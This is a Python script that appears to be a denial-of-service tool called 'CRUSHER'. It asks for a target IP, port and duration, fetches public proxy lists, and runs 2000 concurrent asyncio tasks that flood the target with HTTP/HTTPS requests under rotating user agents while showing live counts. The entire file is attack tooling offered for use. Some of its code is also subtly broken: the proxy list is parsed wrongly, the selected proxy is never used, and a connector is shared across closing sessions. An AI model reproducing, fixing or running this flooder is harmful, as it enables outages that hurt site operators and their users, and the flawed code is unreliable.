
import asyncio
import aiohttp
import random
import time
import os
import sys

from aiohttp import ClientConnectorError, ClientOSError

PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
]

sent_requests = 0
failed_requests = 0

def clear():
    os.system("clear" if os.name == "posix" else "cls")

async def fetch_proxies():
    async with aiohttp.ClientSession() as session:
        async with session.get(PROXY_API_URL) as resp:
            return [p.strip() for p in await resp.text().splitlines() if p.strip()]

async def attack_http(session, url):
    global sent_requests, failed_requests
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*"
    }
    try:
        async with session.get(url, headers=headers, timeout=5) as response:
            await response.read()
            sent_requests += 1
    except (asyncio.TimeoutError, ClientConnectorError, ClientOSError):
        failed_requests += 1
    except:
        failed_requests += 1

async def start_attack(url, duration, proxies):
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = time.time() + duration
    while time.time() < timeout:
        proxy = random.choice(proxies)
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                await attack_http(session, url)
        except:
            continue

async def run_concurrent_attack(url, duration, proxy_list):
    tasks = []
    for _ in range(2000):  # 2000 concurrent tasks
        task = asyncio.create_task(start_attack(url, duration, proxy_list))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def live_status(duration):
    global sent_requests, failed_requests
    start = time.time()
    while time.time() - start < duration:
        print(f"\r[Live] Sent: {sent_requests} | Failed: {failed_requests}", end="")
        await asyncio.sleep(1)
    print()  # move to next line

def print_gui():
    print("""
+===========================+
|         CRUSHER          |
|     Ptero-Bust Mode      |
+===========================+

1. Type     : HTTP / HTTPS
2. Target   : IPv4 Address
3. Port     : Target Port
4. Duration : Max 240 seconds
+===========================+
""")

async def main():
    global sent_requests, failed_requests
    clear()
    print_gui()

    attack_type = input("Select Type (HTTP/HTTPS): ").strip().upper()
    if attack_type not in ["HTTP", "HTTPS"]:
        print("[ERROR] Invalid type.")
        return

    ip = input("Target IP (IPv4): ").strip()
    port = input("Target Port (e.g., 443): ").strip()
    duration = int(input("Attack Duration (max 240s): ").strip())
    if duration > 240:
        print("[ERROR] Duration exceeds limit.")
        return

    url = f"{attack_type.lower()}://{ip}:{port}"
    print(f"[*] Fetching proxies...")
    proxies = await fetch_proxies()
    print(f"[+] Starting attack on {url} for {duration} seconds with 2000 concurrents.\n")

    # Start attack and live status monitor in parallel
    await asyncio.gather(
        run_concurrent_attack(url, duration, proxies),
        live_status(duration)
    )

    print("\n[*] Attack complete.")
    print(f"[+] Total Sent: {sent_requests}")
    print(f"[+] Total Failed: {failed_requests}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Attack aborted.")
